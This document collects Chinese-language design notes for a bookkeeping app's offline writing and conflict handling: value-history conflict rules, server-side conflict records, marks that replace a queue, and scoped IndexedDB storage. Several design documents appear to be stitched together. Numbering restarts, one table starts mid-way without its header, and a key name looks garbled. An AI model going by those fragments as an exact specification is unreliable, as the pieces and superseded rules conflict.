## 一、`归档/S8-冲突-设计决定.md`

**标题**：S8 第 3 轮：冲突（设计决定）。**状态**：✅ 已完成并经所有者双真机确认（2026-10-11，手机 + iPad）。逻辑由所有者逐条确认，本文档是实现的依据；实现与本文档一致（判定只用三个值、签名里没有版本号）。前置：第 1 轮（离线读）、第 2 轮（离线写）已完成并真机确认。本文档只写冲突这一件事，写入与投递机制见 `S8-离线写入-设计决定.md`。

### §1 一句话定义

> ⚠️ **冲突 = 同一个字段，两台设备从同一个原值出发，改成了不同的值。**

- **不是**"两边的当前值不同"，**也不是**"两个人都改过"。
- 定义从所有者的一个前提推出：**"只要设备在线，那么就不会有冲突——在线的设备每次更改都可以看到本来的值以及要改成什么值，那么用户肯定是做好深思熟虑之后再去改的。所以，唯一的冲突体现在离线设备。"**
- ⚠️ 推出一条实现上的**铁律**：**在线设备永远不该冲突**。因为它每次编辑时看到的"原值"就是服务器刚刚给它的那一份，所以"服务器现在的值"必然等于"它记录的原值"。**如果在线设备冲突了，那是实现错了，不是用户错了。**

### §2 判定只用三个值，**不用版本号**

四个值及其提供方：

| 名字 | 含义 | 谁提供 |
|---|---|---|
| **原值 / 历史值（base）** | **这台设备开始改动之前，它看到的值** | **设备**——**只有它知道** |
| **目标值（wanted）** | 用户最后想要的值 | 设备 |
| **服务器当前值（serverValue）** | 服务器现在持有的值 | 服务器 |
| **历史值列表（history）** | 服务器上这个字段**曾经出现过的所有值**（**含当前值**） | 服务器 |

> ⚠️ **判定里没有版本号，这一条是硬的。**
> 早期实现里有过一条 `baseVersion >= serverVersion → 接受`，那是"版本号比较"的残余——**所有者早已否决过它，而它藏在代码里把整个冲突检测吞掉了。**
> **原因**：设备发来的版本号是**它自己条目**的版本，**本机编辑时会自增**，**于是它经常恰好等于服务器上那个数字** → **"没有变化"这条捷径命中 → 直接接受 → 下面的值比较根本没被执行。**
> **症状就是所有者看到的**："冲突检测彻底没了…他会默认使用其中一项，一般来说是断网的修改的数据。"

⚠️ **判据是"设备从哪个值出发"，不是"设备的最终值和服务器一样不一样"**：用"最终值不同"判会把每一笔离线编辑都误报成冲突。

**实现核对**（`apps/api/src/lib/conflicts.ts:155`）：`judge()` 的形参表里确实没有版本号。

### §2.5 ⚠️ 时间不参与冲突判定（所有者决定）

> 所有者原话："我想了想，干脆直接把时间去掉得了——修改默认不改时间；就算改时间，时间冲突也不会被检测。"

做法：

- **`occurredAt` 从 `CONFLICT_FIELDS` 移除**（服务端与客户端两处字段表同步移除）；
- **但它仍然会被写入**——**"不判定"不等于"不生效"**；
- **本地编辑默认不改时间**：编辑页的时间默认取自**这笔账原来的时间**，不是"打开编辑的瞬间"。

理由（不只是简化）：**冲突是让用户在两个值之间选一个，而"20:00 还是 20:05"不是一个关于"谁的决定"的问题，是一个关于时钟的问题。黄标的存在意义是暴露"意图上的分歧"，而时间戳不是。**

### §3 判定表（实现的直接依据，四条按顺序）

| # | 条件 | 结论 | 为什么 |
|---|---|---|---|
| **1** | **`base == 服务器当前值`** | ✅ **接受，写入设备的值** | **服务器正是设备以为的起点——这就是普通在线编辑** |
| **2** | **`wanted == 服务器当前值`** | ✅ **不写，以服务器为准** | **两边目的相同**（**"60 和 60 不弹窗"**） |
| **3** | **`wanted` 在历史值列表里** | ✅ **不写，以服务器为准** | **设备在走一条已经走过的路，只是落后** |
| **4** | **其余** | ⚠️ **冲突** | **设备想去一个服务器从未到过的地方——两个决定出自同一个起点** |

**第 2 条的依据（所有者原话）**：

> "假如服务器上记录的数据是从 40 改到 60，而设备上记录的数据是从 30 改到 60，那么他们的目的一样，当然不能算——我想没有哪个程序会弹出一个弹窗让人选择数字是 60 还是 60。"

**第 3 条的依据（所有者原话）**：

> "如果服务器里记录的是从 30 变成 50 再变成 70，那么 30 和 50 就是历史值——如果本地的数据恰好是 30 或者 50，那么在同步时不用判断冲突，直接改为 70。"

⚠️ **第 3 条比的是"目标值"，不是"原值"——这个区别是所有者点明的。**
他给的例子：**设备停在 30、想改成 65，而服务器是 70（历史 30→50→70）**：

> "判冲突，因为设备是想把 30 改成 65，而不是把 30 改成 70；同时 65（最终值）并不在 30，50 这些服务器历史值里，所以不能说设备改的 65 是已有的路径（也就是只改了一半）。"

所以：**"想去一个已有路径上的值" = 旅程已经在走，只是没走完 → 直接给终点。"想去别的地方" = 一个新的决定 → 问用户。**

⚠️ **而"判定说以服务器为准"必须意味着"什么都不写"**：

| 判定 | 应该 | 早期实现的错误 |
|---|---|---|
| 冲突 | 不写，回 409 | ✅ 正确 |
| **server-wins** | **不写** | ❌ **把请求体里设备的值写进去了** |

**写库时曾无条件写"请求体里的每个字段"，于是判定说"以服务器为准"、而库里存的却是设备的值。修法：只写判定接受的字段（`settledFields`）。**

**`judge()` 的实际签名**（`apps/api/src/lib/conflicts.ts:155`，逐字）：

```ts
export function judge(
  field: ConflictField,
  /** The device's starting value — the owner calls it a 历史值. */
  base: unknown,
  /** What the device wants the field to become. */
  wanted: unknown,
  /** What the server holds right now. */
  serverValue: unknown,
  /**
   * Every value the server has held, **including the one it holds now** (`valuesSeen` appends it).
   */
  history: readonly unknown[] = [],
): Verdict
```

返回类型（同文件 `:107`）：

```ts
export type Verdict =
  | { readonly kind: "accept" }                                    // 第 1 条
  | { readonly kind: "server-wins" }                               // 第 2、3 条
  | { readonly kind: "conflict"; readonly serverValue: unknown };  // 第 4 条
```

**⚠️ 签名里没有版本号参数——这是刻意的。**

**`CONFLICT_FIELDS` 的实际取值**（`apps/api/src/lib/conflicts.ts:35`，共 7 个，逐字）：

```ts
export const CONFLICT_FIELDS = [
  "kind",
  "amountCents",
  "currency",
  "categoryId",
  "paymentMethodId",
  "note",
  "tagIds",
] as const;
```

字段表的注释说明：**"Exactly the editable ones, and no others."** `version` 是机制本身（不是用户选的）、`categoryName` 跟着 `categoryId` 派生、时间戳是服务器的——**比较其中任何一个都会问出一个用户从未选择过的问题**。`occurredAt` 因此不在表内（§2.5）。

`HISTORY_LIMIT = 20`（同文件 `:26`）。

### §4 设备离线期间**每一步都记下来**

> 所有者原话："pad 在离线时不一定只从 A 改成 B；如果 pad 上传的改动是从 A 改成 C 再改成 B 而服务器记录的是 A，那也可以改成 B——总言之，设备本地在恢复网络上传时要把从断网开始的每一步改动都上传。这个实在不行可以用一个 list，第一个值代表原值，第二个值代表改过一次之后的值，第三个值代表改过第二次之后的值等等。"

**做法**：**印记里存一个值链**，第一个是原值。

```
chain: [30, 40, 50]     ← 原值 30，先改成 40，又改成 50
```

**上传时整条链一起报**：**服务器用第一个值判断冲突，用最后一个值作为用户最终要的值**，**中间的值进历史**——它们正是"服务器见过哪些值"这个判据的来源。

### §5 值的历史：**保留最近 20 个**

> 所有者原话："20 个历史值。我不觉得会有人闲的没事，连续改 20 次账单。"

**做法**：**挂在 `Transaction` 行上的 JSON 列**（`value_history`），而不是一张历史表。

| 方案 | 取舍 |
|---|---|
| **独立历史表** | 查询能力更强、可做审计；**但一笔账改 20 次就是 20 行，而这里只需要"某个值出现过没有"** |
| **行上的 JSON 列** ✅ | **一次读写、无 join、row 数量不变**；**代价是不能按历史内容查询**，而目前不需要 |

⚠️ **两者存的信息是一样的，而选择 JSON 是因为"它能回答的问题"和"我们需要回答的问题"完全重合。**

### §6 冲突记在**服务器**上，而不是每台设备各记各的

> 所有者原话："假设有两台设备 A 跟 B，B 设备登录时没有处理标黄事件，那这个事件在服务器还是被标记为冲突。等到某设备处理完之后，冲突的值就被固定下来了，然后同步给所有设备。"

⚠️ **而这是最重要的一条**，因为它决定了"问几次"：

> "因为我们这里考虑的是不同设备，而不是不同用户；不同的设备我们假设本质上都是同一个用户。如果用户对这个冲突做了一次确认，那说明用户已经肯定这次账单的数值了；此时没必要让用户在别的设备上再肯定一次。"

| 时刻 | 服务器 | 设备 A | 设备 B |
|---|---|---|---|
| 冲突产生 | **标记为冲突** | 标黄 | 标黄（下次同步看到） |
| **B 上选了 X** | **冲突解除，值 = X** | 下次同步**直接变 X**，不标黄 | 已同步 |
| **A 一直没处理** | 冲突仍在 | **A 下次同步仍标黄** | — |

⚠️ **所以"黄"不是设备上的状态，而是服务器上的状态在设备上的投影。一台设备处理掉它，所有设备就都不黄了——因为服务器不再标着它。**

#### §6.1 ⚠️ 服务器下发的"冲突包"包含什么

**`GET /api/v1/conflicts` 对每一笔冲突返回**：

| 字段 | 内容 | 为什么必须有 |
|---|---|---|
| **`current`** | **服务器当前持有的那整条账目** | **没有它，前端拿本机副本充当"服务器那一版"，两边一模一样 → 一个选项都生不出来** |
| **`fields`** | 每个冲突字段：**`serverValue`**（服务器值）、**`claims`**（各设备提交的链与设备标识）、**`history`**（服务器见过的值） | **`claims` 是"另一台设备报了什么"的唯一来源** |
| **`transactionId`** | 哪一笔账 | — |

⚠️ **而 409 拒绝时**（`PATCH` 遇到冲突）**返回同样的内容**——`current` + `conflicts`，**这样客户端不必再发一次请求去取**，**而那一取会和别的改动竞争，用户就会对着一个"没有造成分歧的版本"做选择。**

#### §6.2 ⚠️ 选项是**怎么造出来的**（这是"零个选项"的成因）

**冲突界面的候选项由 `conflictChoices.ts` 生成，来源只有两个**：

```
服务器那一版的值
+ 每个 claim 的提交链的最后一个值（也就是那台设备当时想要的）
```

**然后去重**（同一个值只留一个，`tagIds` 按集合比较）。

⚠️ **而"去重后只剩一个值"的字段，根本不问**：

> "我想没有哪个程序会弹出一个弹窗让人选择数字是 60 还是 60。"

| 情形 | 去重后 | 结果 |
|---|---|---|
| 手机的 80 == 服务器的 80，只有 iPad 报的 20 | **{80, 20}** | ✅ **问**（这就是所有者那一轮报的场景） |
| 两台设备报的和服务器一样 | **{X}** | ✅ **不问**——**"60 和 60"** |
| 冲突记录来自旧版本、没有 `claims` | 回退到 `mine` / `theirs` 两个来源 | ✅ 仍能问 |

⚠️ **而"手机本地 == 服务器"曾经导致零个选项**：早期实现只比较"本机副本"和"服务器副本"——手机的两份本来就是 80，**而 iPad 的本机副本又会被月份刷新覆盖成 80**，于是服务器明明还标着冲突，页面却一个候选都列不出来，用户只能按"用这个结果保存"，而那次保存什么也没解决。

⚠️ **所以候选项必须来自服务端的 `claims`，而不是来自"本机与服务器的差异"。**

⚠️ **而这带来一个反直觉的结论：不需要再单独去比较"本机差异"。** 曾经有过一版实现，把"本机值 != 服务器值"的字段也并进问题列表——那个补丁是多余的，而且会引入错误：

| 为什么多余 | 为什么有害 |
|---|---|
| **`claims` 里已经有每一台设备报的值**，包括本机那一台 | **这台设备的"本机副本"可能是被月份下载覆盖过的**（正是零选项的成因），**拿它当判据会问出错误的问题** |

⚠️ **所以只按服务端点名的字段提问，候选只来自 `claims`——"本机差异"这个念头属于"两份副本"那套思路，它已经被换掉了。**

#### §6.3 ⚠️ 时间不产生选择题

`occurredAt` **不在 `CONFLICT_FIELDS` 里，也不进候选生成**（见 §2.5）。

### §7 冲突记录要写清"发生过什么"

> 所有者原话："要记录，最好还能记录冲突是哪两台设备传上来的，他们传出来的结果分别是什么，服务器原来的值是什么，最后改成了什么等等，反正多几行字也占不了多少空间。"

**每一次冲突都留下一条记录**：

| 字段 | 内容 |
|---|---|
| 哪一笔账、哪个字段 | |
| **服务器原来是什么** | 冲突发生时服务器持有的值 |
| **设备 A 报的是什么** | 含它的设备标识与那条值链 |
| **设备 B 报的是什么** | 同上 |
| **最后改成了什么** | 用户的选择 |
| **谁、什么时候解决的** | 设备标识 + 时间 |

⚠️ **而这就是"设备标识"必须存在的原因**——**而它是一台设备，不是一个用户**：同一个账号下，手机和平板要有各自的标识。

⚠️ **而这套记录和"关闭冲突"必须在同一个数据库事务里**：否则一次写到一半的失败会留下"冲突已关、但没有留下为什么"的状态，而审计记录存在的全部意义就是回答"这笔账为什么自己变了"。

#### §7.1 ⚠️ 解决冲突的完整流程（顺序是硬的）

**所有者的原话**：

> "在提交冲突时本地记录选了什么；只要提交了冲突，就先在本地把账单从黄色变成正常的颜色并把所有值改为冲突中本地选择的值；然后再给服务器发信息说明，服务器那边收到之后把冲突结束，并把值改成信息附带的值，跟其他设备同步时直接用这个值覆盖其他设备的值。"

| # | 步骤 | 说明 |
|---|---|---|
| **1** | **本地立刻生效** | 清掉冲突印记、值改成用户选的、**黄色立刻消失** |
| **2** | **把选择排队** | 印记带 `settlesConflict: true`，**它不会因为轮询到旧冲突而被覆盖** |
| **3** | **发给服务器** | `PATCH` 带 `settlesConflict: true` + 用户选的字段 |
| **4** | **服务器跳过判定，直接写** | **用户的答案不是"待判断的过去"，而是"判定所问问题的回答"** |
| **5** | **关闭冲突 + 写审计** | 同一个事务 |
| **6** | **采用服务器返回的规范账目后，才撤销排队标记** | **服务器确认了才算完** |

⚠️ **而第 3 步曾经断链、第 4 步曾经被自己的问题拒签**：

| 曾经的错误 | 表现 |
|---|---|
| `resolveConflict` 写了 `settlesConflict`，**而 `updateBody` 没有把它放进请求体** | 服务器把"解决"当成普通修改 → **又回 409** |
| 判定循环和"还有未解决的吗"检查**都在 `settlesConflict` 之前** | **来回答问题的请求，被那些问题拒签了** |
| `settleConflicts` 收到空对象 | **记录了一次"什么也没选"的决定，什么问题也没关闭** |

⚠️ **而保存失败时**：**保留本机选择、显示错误、明确不退场**——**页面不能假装成功。**

### §8 本地与服务器不符时：**一律用服务器覆盖**，只有一种例外

> 所有者原话："当本地设备和服务器不符时，除非本地设备的值不在服务器的值的历史数据中（也就是本地 A，服务器 B 到 D，这种情况是冲突），否则一律用服务器数据覆盖本地数据。"

⚠️ **这条把"核对"和"编辑"统一成了同一个判据**：**本地这个值，服务器见过吗？**

| 本地值 | 服务器见过吗 | 结论 |
|---|---|---|
| **见过**（在历史里） | ✅ | **覆盖成服务器的当前值**，不打扰用户 |
| **没见过** | ❌ | **⚠️ 冲突，标黄** |

⚠️ **而"没有原值时听服务器的"也落在这条规则里**：重装后的设备报上来的值如果服务器见过，自然覆盖；如果没见过，才标黄。

| 5 | 服务器历史里有那个值、本地是它 | **不标黄**，本地被覆盖成服务器的当前值 |
| 6 | **在线设备改一笔** | **永不标黄**——这是定义推出的必然结果 |
| 7 | **服务器 30→50→70；本地 30 或 50** | **不标黄**，本地变成 70 |
| 8 | **服务器 30→50→70；本地 30，想改成 65** | **标黄**（65 不在历史里） |
| 9 | **两边都改成 60** | **不标黄**——"60 和 60" |
| 10 | **改时间** | **永不标黄**，时间照常写入 |
| 11 | **「清空印记」** | **黄标消失且不再回来** |

### ⭐ 最终的简化：**印记就是队列**

**所有者一句话定了这件事**：**"直接把删除标记作为某一个订单的变量，就比写下一个队列要被删掉更靠谱。"**

**原来的实现有一个持久化的队列**——一个独立的"待办列表"，写着"这个 id 要被删掉"。**而它漂移了**：他 iPad 上出现 **`队列 0 条` 而那两条还红着**——**颜色看印记、投递看队列，两份数据，各说各话。**

**现在没有队列**：`syncAll()` 每次**遍历所有带印记的条目**，按印记决定发什么请求。**待办列表是推导出来的，不是存下来的**——**一个从印记重建的列表，不可能漏掉印记提到的那一条。**

**完整教训见 `教训.md` §8.7 与 §8.8。** 前置：第 1/1.5 轮（离线**读**）已完成并双真机确认。**本轮的验收标准**：**飞行模式下能记账、能改、能删，恢复网络后不重复、不丢。**

### §1 服务端**已经**准备好了什么

**这一轮不是从零开始**——`prisma/schema.prisma` 的注释就是为它写的：

| 已有 | 原话 | 它解决什么 |
|---|---|---|
| **`idempotency_key`**（`@unique`，客户端生成） | **"makes a retried upload harmless — the same key can only ever produce one row"** | **重放不重复**。网络抖动导致的重试、离线期间的重复投递，都只会产生一行 |
| **`version` + `deleted_at`**（软删除） | **"a tombstone, never a hard delete — let a device that was offline learn what changed without resurrecting data"** | **冲突检测**（服务端已有 `version_conflict`）+ **删除不会复活** |
| `POST /transactions` | 已有两段幂等处理（先查 key、再处理竞态） | 创建 |
| `PATCH /transactions/:id` | **要求带 `version`**，不符即 `409 version_conflict` | 修改 |
| `DELETE /transactions/:id` + `POST /:id/restore` | 软删除 | 删除 |

⚠️ **所以本轮要写的是"客户端怎么排、怎么重放"，而不是"服务端怎么支持"。**

### §2 三个基本决定

#### §2.1 ⚠️ 存"每个实体的**最终意图**"，不存操作流水

| 存操作流水 | 存最终意图 ✅ |
|---|---|
| 离线期间改同一笔三次 → 三条记录，重放时发三次 | **一行，只发最后一次** |
| 需要按顺序重放 | **顺序无关** |
| 中间状态会成为"用户其实没想要的结果" | **存的正是用户想要的结果** |

**决定**：**一行一个实体**（用实体 id 做主键），保存**它的目标状态**。
⚠️ **为什么这是对的**：用户在离线时改三次，**他想要的是最终那一版**。把中间两版也发给服务器，是把"过程"当成"意图"——**而过程是实现的细节。**
⚠️ **而那个"一行"后来变成了"印记"，不再是"队列条目"**——见 §3.1。

#### §2.2 ⚠️ 本地立即生效，服务器稍后跟上

**做法**：一次离线写入＝**同时**做两件事：

1. **改本地存储**（`ledger-months`，见 `离线与同步-设计决定.md` §1b）→ **界面立刻变**；
2. **打上"待投递"的印记** → 联网后投递。

⚠️ **两条路各自独立**：**本地那份是"给用户看的"，印记那份是"给服务器看的"。任何一条失败都不能让另一条不动**——**否则一次写入失败会让界面看起来没反应。**

#### §2.3 ⚠️ 本轮不做冲突**解决**，但第 3 轮已经做了

⚠️ 本节记录的是第 2 轮当时的范围，而第 3 轮已经完成——完整的冲突设计见 `S8-冲突-设计决定.md`。**第 2 轮当时定的**：把冲突的原始材料留住（我方那一版、服务端那一版），界面显示"有 N 笔需要处理"，而对比与选择界面留到第 3 轮。

⚠️ **而第 3 轮做完之后，"留住两个快照"这个做法被证明不够**：**两个快照只能表达"本机"和"服务器"两个来源**，而真正的候选来自服务端下发的 `claims`（每一台设备报了什么）——**只比较两个快照会导致"手机本地恰好等于服务器"那种情况下一个候选都生不出来**（见 `S8-冲突-设计决定.md` §6.2）。

### §3 存储结构

#### §3.1 ⚠️ **没有队列了——印记就是队列**

> ⚠️ **`outbox.ts` 已被删除，`outboxSemantics.test.ts` 一并删除。**

**第 2 轮最初实现的是一个真实的队列（`outbox`，一行一个实体）。它被删掉了，因为"队列"和"印记"是两份状态，而它们会不一致——那是一整类 bug 的来源。**

**现在的工作方式**：

| 项 | 做法 |
|---|---|
| **"要发什么"** | **从印记推导**（`intents()`）：`deleted === true` → 删除；`synced === false` → 新建；否则 → 修改 |
| **"什么时候发"** | `syncAll()` **每一轮走遍所有被标记的账目** |
| **持久化** | **只有印记**（`ledger-marks`） |

⚠️ **而这不只是简化**：**所有者报告的"钉子户"**——一行卡着删不掉、红色不退——**正是"队列和印记是两份状态"的后果**：一份记得要删、另一份已经空了，于是那一行永远在等一件没人排队的活。（见 `教训.md` §8.8："要影响某个东西，直接把条件绑在那个东西上，而不是绑在它的位置上。"）

⚠️ **而幂等重放仍然在**：`idempotency_key` 就位，**新建时那个键就是账目自己的 id**，所以重发一次新建是安全的。

**早期设计（已废弃，保留以便读懂旧记录）**：

| 字段 | 说明 |
|---|---|
| `id` | 实体 id（**本身就是主键**——保证"一行一个实体"） |
| `op` | `create` / `update` / `delete` |
| `payload` | **目标状态**（`create` 与 `update` 用；`delete` 为空） |
| `baseVersion` | **离线时看到的版本**——提交时带上去做乐观锁 |
| `queuedAt` | 入队时间（**只用于显示"最久的一条等了多久"**，不用于排序） |
| `attempts` | 重试次数 |
| `lastError` | 上次失败原因 |
| `conflict` | 服务端**当前**那一版（仅冲突时存在） |

⚠️ **其中 `baseVersion` 那一条在第 3 轮被推翻**：判定**不再使用版本号**（所有者否决过它，而它藏着把冲突检测整个吞掉了）。见 `S8-冲突-设计决定.md` §2。
（原文此处自相矛盾：同一段先说"`baseVersion` 是这一轮的关键字段"、随后又标注它已被推翻。**以第 3 轮的结论为准**。）

#### §3.2 本地账目上的标记

| 字段 | 说明 |
|---|---|
| `pending` | 是否还没同步（界面显示"待同步"） |
| `deletedLocally` | 本地已删（**软删，保留原始数据以便冲突对比**） |

**实现核对**（`apps/web/src/lib/offline/localLedger.ts`）：印记存在**独立的键 `ledger-marks`**（不是塞在账目行里，理由是"账目是服务器的响应原样存储，掺入自己的记账字段会让 `Transaction` 的每次 schema 变更都要照顾服务器从未发过的字段"），由 `ledgerMarksKey() = scopedKey("ledger-marks")` 给出。`EntryMark` 的实际字段：

`pending?`、`deleted?`、`synced?`（`false` = 服务器从未收到过，必须 `POST`；否则 `PATCH`）、`tagIds?`（标签不在账目行上，创建时需要）、`chain?`（`Readonly<Record<string, readonly unknown[]>>`，每字段一条值链，第一个是 base、最后一个是 wanted、中间的进服务器历史）、`settlesConflict?`、`conflict?`（`ConflictRecord`：`mine` / `theirs` / `base` / `fields` / `at`）。
**⚠️ 本地已删的条目仍留在 `ledger-mountains`/`ledger-months` 里，不真删**——"留着的代价是几百字节，丢掉的代价是那次对比。"

### §4 重放协议

**触发时机**：① 网络恢复；② 应用回到前台；③ 用户手动点"立即同步"；④ 每次写入后尝试一次。

**每一步**：

```
取出最久未成功的一条
  ├── create  → POST /transactions     （带 idempotencyKey = 实体 id）
  ├── update  → PATCH /transactions/:id（带 version = baseVersion）
  └── delete  → DELETE /transactions/:id
        │
        ├── 2xx  → 清掉印记，本地即为已同步
        ├── 409  → 移入"冲突"状态，保留双方快照（本轮的终点）
        ├── 4xx  → 这条是**永久失败**（例如分类被删了）→ 标记出来，不再重试
        └── 5xx / 网络 → 印记留着，退避后重试
```

**⚠️ 三条纪律**：

| 纪律 | 理由 |
|---|---|
| **一次只投一条，按 `queuedAt` 从旧到新** | 并发投递会让"顺序"变成不可预测的；而用户能感知的是"最早那笔还没上去" |
| **4xx 与 5xx 分开处理** | **5xx 是"稍后再试"，4xx 是"再试一万次也一样"**——**把 4xx 当可重试，会让那一条永远卡在同一个请求上** |
| **重试有退避、有上限** | 无限重试等于无限耗电；上限之后标记为"需要你处理" |

（注：`S8-冲突-设计决定.md` §3 已推翻 `update` 带 `version = baseVersion` 的做法；上表保留的是第 2 轮原文。）

### §1b 数据到底存在哪里（最终结构）

| 存储 | 内容 | 谁写 | 信任级别 |
|---|---|---|---|
| **`ledger-months`** | **按月为键的账目映射** `{ "2026-10": [...] }` | **下载时直接写**（`storeMonth`） | ⭐ **唯一的权威副本**——只增不减，谁也不删 |
| `query-cache` | TanStack 的持久化查询缓存 | 库的 persister | ⚠️ **内存的视图**，会被整份重写；**不承担保存责任** |
| 内存中的查询缓存 | 同上，运行时 | 库 | ⚠️ 同上 |
| `offline-log` | 诊断记录（上限 200 条） | 我们 | 诊断用 |
| `auth-user` | 记住的登录状态 | 我们 | —— |

**⚠️ 为什么最终要自己存一份**（所有者的原话就是设计说明）：

> **"数据保存到本地，然后它就可以直接拿这些本地的数据去计算去显示，毕竟我用电脑直接调一个本地的文件可没出现过这么多问题。"**

**而"查询缓存"不适合承担这个责任**：它是**内存的视图**，而持久化**把这个视图整份写出去**——**任何离开内存的东西，都会被一起写掉。** 下载的六十个月一度变成六个，就是这个原因。

> **一个职责就是"遗忘"的结构，不该用来保存用户唯一的那份数据。**

**实现核对**（`apps/web/src/lib/offline/storage.ts`）：IndexedDB 数据库名 **`libellum`**，schema 版本 **`VERSION = 1`**，**只有一个对象仓库 `STORE = "kv"`**（`createObjectStore("kv")`，无 keyPath、无索引）——即**底层是一个键值存储，不是"每张表一个 store"**。

**scope 键格式**（`apps/web/src/lib/offline/scope.ts`）：

- **scope = `` `${account}:${ledger}` ``**，即 **`userId:bookId`**（`recompute()` 里 `account !== "" && ledger !== "" ? \`${account}:${ledger}\` : ""`）。
- **`scopedKey(base)` = scope 为空时原样返回 `base`，否则返回 `` `${base}:${scope}` ``**。
- 所以实际的键形如 **`ledger-months:<userId>:<bookId>`**、**`ledger-marks:<userId>:<bookId>`**。
- scope 自身记在键 **`offline-scope`** 下，存 `{ account, ledger }`；**必须能同步读**（`restoreOfflineScopeSync()`，在 `main.tsx` 首次渲染前调用），因为**持久化查询缓存读得很早、而它的键现在依赖 scope**——scope 还没恢复就开读，会**读到别的账号的副本、或什么都读不到**。
- 所有者的原话理由：**"同一台设备上还可能切换不同账号。如果只有 bookId，缓存读取、退出登录和身份失效时仍可能出现数据暴露或混用风险。"** 没有账号那一半，**在同一部手机上登录另一个人，会直接看到上一个人的账本**。
- **商店以字符串为键，所以 scope 只是字符串前缀**——不需要建 store、不需要建索引、**不需要升存储版本**。
- `migrateUnscopedKeys(bases)`：把 scope 之前写在全局键下的旧副本**拷进**当前 scope 一次（**拷贝而不是删除**——"删掉兜底的那次清理，就是一次可能丢掉唯一副本的清理"；幂等，目标已存在就跳过）。

**`gcTime` / `staleTime` 设定**（实现核对 `apps/web/src/App.tsx`）：

| 参数 | 值 | 位置 | 理由 |
|---|---|---|---|
| **`gcTime`** | **`Number.POSITIVE_INFINITY`（`Infinity`）** | `App.tsx:90` | 缓存的**是用户自己的账本**，不存在哪一种"你自己的记录过期了"对他们有帮助。**"陈旧"该被说出来，不是删掉**。TanStack 默认 `gcTime` 是 5 分钟——**那正是"下载 60 个月变成 6 个月"的成因**：内存里没人引用的月份被回收，而持久化把内存视图整份写出去，于是被回收的那些在磁盘上也没了。`gcTime: Infinity` 停掉了这场驱逐；**第二道防线是 `cacheMerge`**（见下） |
| **`staleTime`** | **`30_000`（30 秒）** | `App.tsx:65` | 查询默认新鲜度；各查询另有覆盖：多数写入类/明细类查询是 `staleTime: 0`（每次都重取），`queries.ts` 里另有 `5 * 60 * 1000`（分类/支付方式/标签等元数据）与 `60_000` 的条目 |

**`cacheMerge` 的第二道防线**（`cacheMerge.test.ts` 注释）：持久化层保存的是**内存缓存整份**，而 TanStack 默认 `gcTime` 是五分钟——两道修法，`gcTime: Infinity` 是第一道，**"合并而不是覆盖"是第二道**：**被驱逐的旧月份在写回时要保留，而不是跟着内存一起消失。**

### §2 四个基本决定

#### §2.1 缓存"查询响应"，不缓存"表结构"

**决定**：用 TanStack Query 的持久化把**查询缓存**存进 IndexedDB。

| 手写表结构 | 持久化查询缓存 ✅ |
|---|---|
| **是 schema 的第二份定义**，加一列就开始漂移 | **是"响应"的副本**，只依赖缓存语义 |
| 每个页面都要写一遍查询 | 页面**已经在用了** |
| —— | **离线可读范围 = 已成功请求过的范围**，正是想要的 |

**底层是一个键值存储**（`storage.ts`），不是"每张表一个 store"：**缓存不需要查询能力**——"十月有哪些账"由**已经会做的内存代码**回答。

#### §2.2 数据真的在本机，不是"只是缓存"

**所有者问过**："网页只有缓存，没办法真的把数据下到用户本机里。实在不行我看看打包成 APK。"

| 直觉 | 实际 |
|---|---|
| "网页只有缓存" | **IndexedDB 是真实数据库**，就在浏览器数据目录里，**和原生 App 存文件是同一件事** |
| "打包成 APK 就能离线" | **APK 里的 WebView 用的是同一套 IndexedDB**，机制完全一样 |

> **Web 在这里不是"原生应用的薄版本"，而是"同一套安排换了安装方式"。打包能换来图标、推送、应用商店——不是离线能力。**

⚠️ **但"缓存会被清掉"是真事**：浏览器存储**默认是 best-effort**，空间紧张时可能被回收；**Safari 对七天未访问的站点会清除**。
**修法**：`navigator.storage.persist()`（`persistence.ts`）。**浏览器拒绝时，在下载管理页明确告知**——**这件事该在家里知道，不是在飞机上发现。**

#### §2.3 提醒"有新闻才出现"，不做常驻

**所有者的意见**：**"不仅不太美观，用户平时也可能看不见"** —— 第二条是更要紧的：

> **一条永远在那里的提示，就没人再读了**——于是它唯一该起作用的那次，它是隐形的。

| 时机 | 行为 |
|---|---|
| 下载中 | **所有页面顶部**常驻 + 进度 |
| 刚下载完 | **再留 10 秒** |
| 之后 | **自动收回，不再出现**（直到下一次下载） |
| 每次都提示 | **"可以在「账户 → 下载管理」里查看和调整"** |

⚠️ **倒计时属于"下载"，不属于"看它的人"**（见 §3.4）。
**唯一的例外不自动消失**：**"浏览器未承诺保留"**——它不是会过期的新闻。

#### §2.4 警告放在"它是主题"的界面

**所有者的意见**：**"把这个弹窗挪到下载管理界面以及下载管理的每个子界面"**。
**理由和 §2.3 相同**：**跟着用户到处走的警告，就没人读了**。持久化警告因此只出现在「下载管理」和「月份下载管理」两页——**而这两页是用户主动打开的**。

### §3 被证明是错的四个做法（教训）

> ⚠️ **这一节是本文档最重要的部分。** 这四条都"看起来对、写起来也顺"，**而且都是靠真机反馈才推翻的**。

#### §3.1 ⚠️ 用"比例"定位，永远落不到中线上

**问题**：核对页的日期框与时间框重叠。**所有者报了三次**：

| 版本 | 定位方式 | 结果 |
|---|---|---|
| 一 | 行 `w-3/5`，内部 3:2 分 | 时间框在 **42%**——偏左一个字 |
| 二 | 两列各 `basis-1/2`（撑满屏幕） | 时间框在 **50% + 半个 gap**——偏右一个字 |
| 三 | 行 = 屏幕左半 + `justify-between`，**但规则写在 `min-[360px]:` 断点里** | 手机上断点**没命中**，`min-w-0` 也一起失效 → **日期框撑爆、时间框被挤出屏幕** |
| **四** | **两行，一行一个框**（所有者拍的板） | ✅ 整类问题消失 |

**教训**：
1. **"窄一点"是感觉，"中线"是约束。** 可验证的约束一次到位，凭感觉的要来回三次；
2. **同一个地方被报多次，说明要换方案而不是继续调参数**；
3. ⚠️ **一条"必须成立"的规则，绝不能写进"可能不成立"的条件里**。响应式断点只能放锦上添花；**断点没命中时页面会坏得很难看，而不是优雅降级**；
4. **浏览器的视口逻辑宽度 ≠ 屏幕物理宽度**。用宽度断点控制布局的正确性，是在赌一个自己不完全掌握的输入。

#### §3.2 ⚠️ "请求失败"和"服务器拒绝了"是两件事

**问题**：离线时应用表现得像**已登出**。

```ts
catch { setUser(null); }     // ← 任何失败都当作"未登录"
```

**连锁后果，而且正好在最需要它的时候发生**：① 离线时 `GET /auth/me` 请求不出去 → 被当作已登出；② **缓存好的账本被登录页挡住**；③ **而且过不去**——**登录也需要网络**。

> **这个应用在最需要它的场景下完全不可用。**

**修法**：只有**服务器明确说 `401`** 才结束会话；够不着服务器时**沿用上次记住的用户**。
